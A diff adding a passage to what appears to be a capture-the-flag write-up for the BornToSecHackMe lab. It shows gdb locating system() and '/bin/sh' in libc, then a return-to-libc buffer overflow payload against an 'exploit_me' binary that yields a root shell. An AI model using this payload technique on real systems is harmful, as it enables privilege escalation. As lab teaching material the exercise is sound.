@@ -470,3 +470,28 @@ Finish this challenge and use the result as password for 'zaz' user.
 The message is: "SLASH"
 md5(SLASH) = 646da671ca01bb5d84dbb5fb2238dc8e
 ```
+
+```
+(gdb) r
+Starting program: /home/zaz/exploit_me 
+[Inferior 1 (process 2065) exited with code 01]
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+```
+
+# https://beta.hackndo.com/retour-a-la-libc/
+
+```
+(gdb) find __libc_start_main,+999999999,"/bin/sh"
+0xb7f8cc58
+warning: Unable to access target memory at 0xb7fd3160, halting search.
+1 pattern found
+
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c "print('a'*140 + '\x60\xb0\xe6\xb7' 'OSEF' + '\x58\xcc\xf8\xb7')")
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`??OSEFX???
+# ls
+exploit_me  mail
+# whoami
+root
+#
+``
